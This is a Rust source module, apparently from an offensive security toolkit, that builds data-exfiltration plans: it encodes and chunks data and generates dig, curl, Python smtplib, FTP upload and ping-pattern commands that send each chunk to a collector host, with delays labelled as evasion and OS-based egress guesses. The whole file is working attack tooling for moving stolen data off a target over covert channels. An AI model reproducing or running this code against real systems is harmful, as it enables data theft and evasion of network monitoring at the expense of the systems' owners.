/// Out-of-band data exfiltration engine.
///
/// Extends DNS exfiltration with additional OOB channels (HTTP callbacks,
/// SMTP, FTP, ICMP tunnels) for exfiltrating data when the HTTP response
/// body is not visible to the attacker. Generates shell commands and
/// reassembly instructions per channel.
use std::collections::HashMap;
use std::fmt;

/// Maximum bytes per DNS query label payload (after sequence prefix).
const DNS_MAX_PAYLOAD: usize = 253;

/// Practical ceiling for HTTP POST body in a single callback.
const HTTP_MAX_PAYLOAD: usize = 1_048_576;

/// SMTP body ceiling (10 MB base64-encoded).
const SMTP_MAX_PAYLOAD: usize = 10_485_760;

/// FTP has no practical per-chunk ceiling; we use a large sentinel.
const FTP_MAX_PAYLOAD: usize = usize::MAX;

/// ICMP echo payload ceiling (typical MTU minus headers).
const ICMP_MAX_PAYLOAD: usize = 1_400;

/// Threshold below which DNS is preferred for small exfil.
const DNS_PREFERENCE_CEILING: usize = 4_096;

/// Available OOB exfiltration channels.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum OobChannel {
    Dns,
    HttpCallback,
    Smtp,
    Ftp,
    IcmpTunnel,
}

impl fmt::Display for OobChannel {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            OobChannel::Dns => write!(f, "dns"),
            OobChannel::HttpCallback => write!(f, "http-callback"),
            OobChannel::Smtp => write!(f, "smtp"),
            OobChannel::Ftp => write!(f, "ftp"),
            OobChannel::IcmpTunnel => write!(f, "icmp-tunnel"),
        }
    }
}

/// Result of heuristic egress capability detection for a target OS.
#[derive(Debug, Clone)]
pub struct EgressProfile {
    /// Channels believed to be available on the target.
    pub available_channels: Vec<OobChannel>,
    /// Best default channel given OS constraints.
    pub preferred_channel: OobChannel,
    /// Whether outbound DNS resolution is likely available.
    pub dns_available: bool,
    /// Whether outbound HTTP(S) connections are likely available.
    pub http_outbound: bool,
    /// Whether outbound SMTP (port 25/587) is likely available.
    pub smtp_outbound: bool,
    /// Whether outbound FTP (port 21) is likely available.
    pub ftp_outbound: bool,
    /// Whether raw ICMP echo is allowed (requires privileges on some OSes).
    pub icmp_allowed: bool,
    /// Per-channel maximum single-chunk payload size in bytes.
    pub max_payload_size: HashMap<OobChannel, usize>,
}

/// Configuration for an OOB exfiltration plan.
#[derive(Debug, Clone)]
pub struct OobExfilConfig {
    /// Hostname or IP of the collector receiving exfiltrated data.
    pub collector_host: String,
    /// Which OOB channel to use.
    pub channel: OobChannel,
    /// Maximum encoded bytes per chunk.
    pub chunk_size: usize,
    /// Milliseconds to wait between transmitting chunks (evasion).
    pub delay_between_chunks_ms: u64,
    /// Encoding applied to raw data before chunking.
    pub encoding: DataEncoding,
    /// Retry count per chunk on transmission failure.
    pub max_retries: u32,
}

/// Encoding for data in transit.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DataEncoding {
    Base64,
    Hex,
    Base32,
}

impl fmt::Display for DataEncoding {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            DataEncoding::Base64 => write!(f, "base64"),
            DataEncoding::Hex => write!(f, "hex"),
            DataEncoding::Base32 => write!(f, "base32"),
        }
    }
}

/// A single exfiltration chunk ready for transmission.
#[derive(Debug, Clone)]
pub struct ExfilChunk {
    /// 0-based sequence index.
    pub sequence: u32,
    /// Total chunks in the plan.
    pub total_chunks: u32,
    /// Channel this chunk targets.
    pub channel: OobChannel,
    /// Encoded payload bytes for this chunk.
    pub encoded_payload: String,
    /// Shell command that transmits this chunk to the collector.
    pub transmission_command: String,
}

/// Complete exfiltration plan for a data target.
#[derive(Debug, Clone)]
pub struct ExfilPlan {
    /// Human-readable description of what is being exfiltrated.
    pub target_description: String,
    /// Channel used.
    pub channel: OobChannel,
    /// Ordered list of chunks to transmit.
    pub chunks: Vec<ExfilChunk>,
    /// Original data size in bytes (before encoding).
    pub total_data_size: usize,
    /// Estimated wall-clock time including inter-chunk delays.
    pub estimated_time_ms: u64,
    /// CRC32 hex checksum of the original data.
    pub checksum: String,
    /// Instructions for the collector to reassemble chunks.
    pub reassembly_instructions: String,
}

/// Errors from OOB exfiltration planning.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum OobExfilError {
    NoAvailableChannel,
    PayloadTooLarge(String),
    EncodingError(String),
    ChannelUnavailable(OobChannel),
    InvalidConfig(String),
}

impl fmt::Display for OobExfilError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            OobExfilError::NoAvailableChannel => write!(f, "no egress channel available"),
            OobExfilError::PayloadTooLarge(msg) => write!(f, "payload too large: {msg}"),
            OobExfilError::EncodingError(msg) => write!(f, "encoding error: {msg}"),
            OobExfilError::ChannelUnavailable(ch) => write!(f, "channel unavailable: {ch}"),
            OobExfilError::InvalidConfig(msg) => write!(f, "invalid config: {msg}"),
        }
    }
}

impl std::error::Error for OobExfilError {}

// ---------------------------------------------------------------------------
// Encoding helpers (private)
// ---------------------------------------------------------------------------

pub(crate) fn encode_data(data: &[u8], encoding: DataEncoding) -> String {
    match encoding {
        DataEncoding::Base64 => base64_encode(data),
        DataEncoding::Hex => hex_encode(data),
        DataEncoding::Base32 => base32_encode(data),
    }
}

fn base64_encode(data: &[u8]) -> String {
    const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::with_capacity(data.len().div_ceil(3) * 4);
    for chunk in data.chunks(3) {
        let b0 = chunk[0] as u32;
        let b1 = if chunk.len() > 1 { chunk[1] as u32 } else { 0 };
        let b2 = if chunk.len() > 2 { chunk[2] as u32 } else { 0 };
        let triple = (b0 << 16) | (b1 << 8) | b2;
        out.push(ALPHABET[((triple >> 18) & 0x3F) as usize] as char);
        out.push(ALPHABET[((triple >> 12) & 0x3F) as usize] as char);
        if chunk.len() > 1 {
            out.push(ALPHABET[((triple >> 6) & 0x3F) as usize] as char);
        } else {
            out.push('=');
        }
        if chunk.len() > 2 {
            out.push(ALPHABET[(triple & 0x3F) as usize] as char);
        } else {
            out.push('=');
        }
    }
    out
}

fn hex_encode(data: &[u8]) -> String {
    let mut out = String::with_capacity(data.len() * 2);
    for byte in data {
        out.push_str(&format!("{byte:02x}"));
    }
    out
}

fn base32_encode(data: &[u8]) -> String {
    const ALPHABET: &[u8] = b"abcdefghijklmnopqrstuvwxyz234567";
    let mut out = String::new();
    let mut buffer: u64 = 0;
    let mut bits: u32 = 0;
    for &byte in data {
        buffer = (buffer << 8) | u64::from(byte);
        bits += 8;
        while bits >= 5 {
            bits -= 5;
            let idx = ((buffer >> bits) & 0x1f) as usize;
            out.push(ALPHABET[idx] as char);
        }
    }
    if bits > 0 {
        let idx = ((buffer << (5 - bits)) & 0x1f) as usize;
        out.push(ALPHABET[idx] as char);
    }
    out
}

fn chunk_data(encoded: &str, chunk_size: usize) -> Vec<String> {
    if encoded.is_empty() {
        return vec![String::new()];
    }
    encoded
        .as_bytes()
        .chunks(chunk_size)
        .map(|c| String::from_utf8(c.to_vec()).expect("encoding produced valid utf8"))
        .collect()
}

fn compute_checksum(data: &[u8]) -> String {
    format!("{:08x}", crc32fast::hash(data))
}

// ---------------------------------------------------------------------------
// Egress detection (heuristic, not live probing)
// ---------------------------------------------------------------------------

fn default_payload_sizes() -> HashMap<OobChannel, usize> {
    let mut m = HashMap::new();
    m.insert(OobChannel::Dns, DNS_MAX_PAYLOAD);
    m.insert(OobChannel::HttpCallback, HTTP_MAX_PAYLOAD);
    m.insert(OobChannel::Smtp, SMTP_MAX_PAYLOAD);
    m.insert(OobChannel::Ftp, FTP_MAX_PAYLOAD);
    m.insert(OobChannel::IcmpTunnel, ICMP_MAX_PAYLOAD);
    m
}

/// Heuristic detection of likely egress channels based on target OS.
///
/// Linux targets typically have all channels available. Windows targets
/// lack raw ICMP sockets without elevated privileges. macOS is similar
/// to Linux but ICMP requires root.
pub fn detect_egress_capabilities(target_os: &str) -> EgressProfile {
    let os_lower = target_os.to_lowercase();
    let is_windows = os_lower.contains("windows") || os_lower.contains("win");
    let is_macos = os_lower.contains("macos") || os_lower.contains("darwin");

    let dns_available = true;
    let http_outbound = true;
    let smtp_outbound = !is_windows;
    let ftp_outbound = true;
    let icmp_allowed = !is_windows && !is_macos;

    let mut available = vec![OobChannel::Dns, OobChannel::HttpCallback, OobChannel::Ftp];
    if smtp_outbound {
        available.push(OobChannel::Smtp);
    }
    if icmp_allowed {
        available.push(OobChannel::IcmpTunnel);
    }

    let preferred = if http_outbound {
        OobChannel::HttpCallback
    } else {
        OobChannel::Dns
    };

    EgressProfile {
        available_channels: available,
        preferred_channel: preferred,
        dns_available,
        http_outbound,
        smtp_outbound,
        ftp_outbound,
        icmp_allowed,
        max_payload_size: default_payload_sizes(),
    }
}

// ---------------------------------------------------------------------------
// Channel selection
// ---------------------------------------------------------------------------

/// Select the optimal exfiltration channel for a given data size.
///
/// DNS is preferred for small payloads (<4 KB). HTTP for medium. FTP or
/// SMTP for large. Falls back through the profile's available channels.
pub fn select_optimal_channel(profile: &EgressProfile, data_size: usize) -> OobChannel {
    let has = |ch: OobChannel| profile.available_channels.contains(&ch);

    if data_size < DNS_PREFERENCE_CEILING && has(OobChannel::Dns) {
        return OobChannel::Dns;
    }
    if data_size < HTTP_MAX_PAYLOAD && has(OobChannel::HttpCallback) {
        return OobChannel::HttpCallback;
    }
    if has(OobChannel::Ftp) {
        return OobChannel::Ftp;
    }
    if has(OobChannel::Smtp) {
        return OobChannel::Smtp;
    }
    if has(OobChannel::HttpCallback) {
        return OobChannel::HttpCallback;
    }
    if has(OobChannel::Dns) {
        return OobChannel::Dns;
    }
    profile.preferred_channel
}

// ---------------------------------------------------------------------------
// Channel-specific plan generators
// ---------------------------------------------------------------------------

fn validate_config(config: &OobExfilConfig) -> Result<(), OobExfilError> {
    if config.collector_host.is_empty() {
        return Err(OobExfilError::InvalidConfig(
            "collector_host is empty".into(),
        ));
    }
    if config.chunk_size == 0 {
        return Err(OobExfilError::InvalidConfig(
            "chunk_size must be > 0".into(),
        ));
    }
    Ok(())
}

fn build_plan(
    data: &[u8],
    config: &OobExfilConfig,
    chunks: Vec<ExfilChunk>,
    description: &str,
    reassembly: &str,
) -> ExfilPlan {
    let per_chunk_ms = config.delay_between_chunks_ms;
    let estimated = if chunks.is_empty() {
        0
    } else {
        (chunks.len() as u64 - 1) * per_chunk_ms + chunks.len() as u64 * 50
    };
    ExfilPlan {
        target_description: description.to_string(),
        channel: config.channel,
        chunks,
        total_data_size: data.len(),
        estimated_time_ms: estimated,
        checksum: compute_checksum(data),
        reassembly_instructions: reassembly.to_string(),
    }
}

/// Generate DNS exfiltration commands (`dig`/`nslookup`).
///
/// Encodes data into DNS-safe labels and produces one `dig` query per chunk.
pub fn generate_dns_exfil_commands(
    data: &[u8],
    config: &OobExfilConfig,
) -> Result<ExfilPlan, OobExfilError> {
    validate_config(config)?;
    let encoded = encode_data(data, config.encoding);
    let parts = chunk_data(&encoded, config.chunk_size.min(DNS_MAX_PAYLOAD));
    let total = parts.len() as u32;

    let chunks: Vec<ExfilChunk> = parts
        .into_iter()
        .enumerate()
        .map(|(i, payload)| {
            let seq = i as u32;
            let qname = format!("s{seq:02x}-{payload}.{}", config.collector_host);
            let cmd = format!("dig +short {qname} @8.8.8.8");
            ExfilChunk {
                sequence: seq,
                total_chunks: total,
                channel: OobChannel::Dns,
                encoded_payload: payload,
                transmission_command: cmd,
            }
        })
        .collect();

    let reassembly = format!(
        "Concatenate DNS query labels in sequence order, decode with {}, verify CRC32.",
        config.encoding
    );
    Ok(build_plan(data, config, chunks, "dns exfil", &reassembly))
}

/// Generate HTTP callback commands (`curl` POST).
pub fn generate_http_callback_commands(
    data: &[u8],
    config: &OobExfilConfig,
) -> Result<ExfilPlan, OobExfilError> {
    validate_config(config)?;
    let encoded = encode_data(data, config.encoding);
    let parts = chunk_data(&encoded, config.chunk_size);
    let total = parts.len() as u32;

    let chunks: Vec<ExfilChunk> = parts
        .into_iter()
        .enumerate()
        .map(|(i, payload)| {
            let seq = i as u32;
            let url = format!("http://{}/exfil/{seq}", config.collector_host);
            let cmd = format!("curl -s -X POST -d '{payload}' '{url}'");
            ExfilChunk {
                sequence: seq,
                total_chunks: total,
                channel: OobChannel::HttpCallback,
                encoded_payload: payload,
                transmission_command: cmd,
            }
        })
        .collect();

    let reassembly = format!(
        "Collect POST bodies ordered by /exfil/{{seq}}, concatenate, decode with {}.",
        config.encoding
    );
    Ok(build_plan(
        data,
        config,
        chunks,
        "http callback exfil",
        &reassembly,
    ))
}

/// Generate SMTP exfiltration commands (Python one-liner smtp).
pub fn generate_smtp_exfil_commands(
    data: &[u8],
    config: &OobExfilConfig,
) -> Result<ExfilPlan, OobExfilError> {
    validate_config(config)?;
    let encoded = encode_data(data, config.encoding);
    let parts = chunk_data(&encoded, config.chunk_size);
    let total = parts.len() as u32;

    let chunks: Vec<ExfilChunk> = parts
        .into_iter()
        .enumerate()
        .map(|(i, payload)| {
            let seq = i as u32;
            let cmd = format!(
                "python3 -c \"import smtplib; s=smtplib.SMTP('{}',25); \
                 s.sendmail('a@b.c','exfil@{}','Subject: s{seq:02x}\\n\\n{payload}'); s.quit()\"",
                config.collector_host, config.collector_host
            );
            ExfilChunk {
                sequence: seq,
                total_chunks: total,
                channel: OobChannel::Smtp,
                encoded_payload: payload,
                transmission_command: cmd,
            }
        })
        .collect();

    let reassembly = format!(
        "Parse email subjects for sequence (s{{XX}}), concatenate bodies, decode with {}.",
        config.encoding
    );
    Ok(build_plan(data, config, chunks, "smtp exfil", &reassembly))
}

/// Generate FTP exfiltration commands (`curl -T`).
pub fn generate_ftp_exfil_commands(
    data: &[u8],
    config: &OobExfilConfig,
) -> Result<ExfilPlan, OobExfilError> {
    validate_config(config)?;
    let encoded = encode_data(data, config.encoding);
    let parts = chunk_data(&encoded, config.chunk_size);
    let total = parts.len() as u32;

    let chunks: Vec<ExfilChunk> = parts
        .into_iter()
        .enumerate()
        .map(|(i, payload)| {
            let seq = i as u32;
            let remote_path = format!("ftp://{}/chunk_{seq:04}.dat", config.collector_host);
            let cmd = format!("echo -n '{payload}' | curl -s -T - '{remote_path}'");
            ExfilChunk {
                sequence: seq,
                total_chunks: total,
                channel: OobChannel::Ftp,
                encoded_payload: payload,
                transmission_command: cmd,
            }
        })
        .collect();

    let reassembly = format!(
        "Download chunk_XXXX.dat files in order, concatenate, decode with {}.",
        config.encoding
    );
    Ok(build_plan(data, config, chunks, "ftp exfil", &reassembly))
}

/// Generate ICMP tunnel commands (`ping -p`).
///
/// Encodes data into the hex pattern field of ICMP echo requests.
pub fn generate_icmp_tunnel_commands(
    data: &[u8],
    config: &OobExfilConfig,
) -> Result<ExfilPlan, OobExfilError> {
    validate_config(config)?;
    let encoded = encode_data(data, config.encoding);
    let effective_chunk = config.chunk_size.min(ICMP_MAX_PAYLOAD);
    let parts = chunk_data(&encoded, effective_chunk);
    let total = parts.len() as u32;

    let chunks: Vec<ExfilChunk> = parts
        .into_iter()
        .enumerate()
        .map(|(i, payload)| {
            let seq = i as u32;
            let hex_payload = hex_encode(payload.as_bytes());
            let cmd = format!("ping -c 1 -p {} {}", hex_payload, config.collector_host);
            ExfilChunk {
                sequence: seq,
                total_chunks: total,
                channel: OobChannel::IcmpTunnel,
                encoded_payload: payload,
                transmission_command: cmd,
            }
        })
        .collect();

    let reassembly = format!(
        "Extract ICMP echo payloads, hex-decode to recover {} chunks, concatenate, decode with {}.",
        total, config.encoding
    );
    Ok(build_plan(
        data,
        config,
        chunks,
        "icmp tunnel exfil",
        &reassembly,
    ))
}

// ---------------------------------------------------------------------------
// Master dispatcher
// ---------------------------------------------------------------------------

/// Plan exfiltration of arbitrary data over the configured OOB channel.
///
/// Dispatches to the appropriate channel-specific generator based on
/// `config.channel`.
pub fn plan_exfiltration(data: &[u8], config: &OobExfilConfig) -> Result<ExfilPlan, OobExfilError> {
    match config.channel {
        OobChannel::Dns => generate_dns_exfil_commands(data, config),
        OobChannel::HttpCallback => generate_http_callback_commands(data, config),
        OobChannel::Smtp => generate_smtp_exfil_commands(data, config),
        OobChannel::Ftp => generate_ftp_exfil_commands(data, config),
        OobChannel::IcmpTunnel => generate_icmp_tunnel_commands(data, config),
    }
}

// ---------------------------------------------------------------------------
// Decode helpers — only used in tests for roundtrip verification
// ---------------------------------------------------------------------------

#[cfg(test)]
fn base64_decode(s: &str) -> Result<Vec<u8>, OobExfilError> {
    fn val(c: u8) -> Result<u32, OobExfilError> {
        match c {
            b'A'..=b'Z' => Ok((c - b'A') as u32),
            b'a'..=b'z' => Ok((c - b'a' + 26) as u32),
            b'0'..=b'9' => Ok((c - b'0' + 52) as u32),
            b'+' => Ok(62),
            b'/' => Ok(63),
            b'=' => Ok(0),
            _ => Err(OobExfilError::EncodingError(format!(
                "invalid base64 char: {c}"
            ))),
        }
    }
    let bytes = s.as_bytes();
    let mut out = Vec::with_capacity(bytes.len() * 3 / 4);
    for chunk in bytes.chunks(4) {
        if chunk.len() < 4 {
            return Err(OobExfilError::EncodingError(
                "base64 input length not multiple of 4".into(),
            ));
        }
        let a = val(chunk[0])?;
        let b = val(chunk[1])?;
        let c = val(chunk[2])?;
        let d = val(chunk[3])?;
        let triple = (a << 18) | (b << 12) | (c << 6) | d;
        out.push((triple >> 16) as u8);
        if chunk[2] != b'=' {
            out.push((triple >> 8) as u8);
        }
        if chunk[3] != b'=' {
            out.push(triple as u8);
        }
    }
    Ok(out)
}

#[cfg(test)]
fn hex_decode(s: &str) -> Result<Vec<u8>, OobExfilError> {
    if !s.len().is_multiple_of(2) {
        return Err(OobExfilError::EncodingError(
            "hex string has odd length".into(),
        ));
    }
    let bytes = s.as_bytes();
    let mut out = Vec::with_capacity(bytes.len() / 2);
    for i in (0..bytes.len()).step_by(2) {
        let hi = hex_nibble(bytes[i])?;
        let lo = hex_nibble(bytes[i + 1])?;
        out.push((hi << 4) | lo);
    }
    Ok(out)
}

#[cfg(test)]
fn hex_nibble(b: u8) -> Result<u8, OobExfilError> {
    match b {
        b'0'..=b'9' => Ok(b - b'0'),
        b'a'..=b'f' => Ok(b - b'a' + 10),
        b'A'..=b'F' => Ok(b - b'A' + 10),
        _ => Err(OobExfilError::EncodingError(format!(
            "invalid hex nibble: {b}"
        ))),
    }
}

#[cfg(test)]
fn base32_decode(s: &str) -> Result<Vec<u8>, OobExfilError> {
    let mut buffer: u64 = 0;
    let mut bits: u32 = 0;
    let mut out = Vec::new();
    for ch in s.chars() {
        let val = match ch {
            'a'..='z' => (ch as u8) - b'a',
            'A'..='Z' => (ch as u8) - b'A',
            '2'..='7' => (ch as u8) - b'2' + 26,
            _ => {
                return Err(OobExfilError::EncodingError(format!(
                    "invalid base32 char: {ch}"
                )));
            }
        };
        buffer = (buffer << 5) | u64::from(val);
        bits += 5;
        if bits >= 8 {
            bits -= 8;
            out.push((buffer >> bits) as u8);
        }
    }
    Ok(out)
}

#[cfg(test)]
pub(crate) fn decode_data(encoded: &str, encoding: DataEncoding) -> Result<Vec<u8>, OobExfilError> {
    match encoding {
        DataEncoding::Base64 => base64_decode(encoded),
        DataEncoding::Hex => hex_decode(encoded),
        DataEncoding::Base32 => base32_decode(encoded),
    }
}
